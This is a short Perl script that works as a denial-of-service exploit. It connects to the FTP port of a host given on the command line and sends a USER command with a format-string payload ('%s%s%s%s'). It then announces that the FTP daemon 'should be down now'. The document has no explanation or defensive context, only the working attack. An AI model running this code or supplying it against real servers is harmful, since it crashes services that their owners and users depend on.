!/usr/bin/perl
use IO::Socket;
unless (@ARGV == 1) { die "usage: $0 host ..." }
$host = shift(@ARGV);
$remote = IO::Socket::INET->new( Proto => "tcp",
PeerAddr => $host,
PeerPort => "ftp(21)",
);
unless ($remote) { die "cannot connect to ftp daemon on $host" }

$remote->autoflush(1);
$fstring = "%s%s%s%s";

print $remote "USER $fstring\r\n";
sleep(1);

print "ftp deamon should be down now!!!\n\n";
close $remote;
